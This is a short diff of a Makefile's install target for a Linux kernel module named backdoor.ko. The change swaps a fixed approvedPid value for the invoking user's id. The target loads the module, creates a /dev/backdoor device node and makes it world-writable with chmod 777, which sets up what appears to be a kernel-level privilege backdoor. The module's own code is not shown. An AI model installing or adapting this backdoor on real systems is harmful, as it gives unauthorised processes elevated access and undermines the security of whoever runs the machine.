@@ -16,7 +16,7 @@ test: test.c
 
 install: all
 	modinfo backdoor.ko
-	insmod ./backdoor.ko approvedPid=1000
+	insmod ./backdoor.ko approvedPid=$(shell id -u)
 	mknod /dev/backdoor c 254 0 
 	chmod 777 /dev/backdoor
 
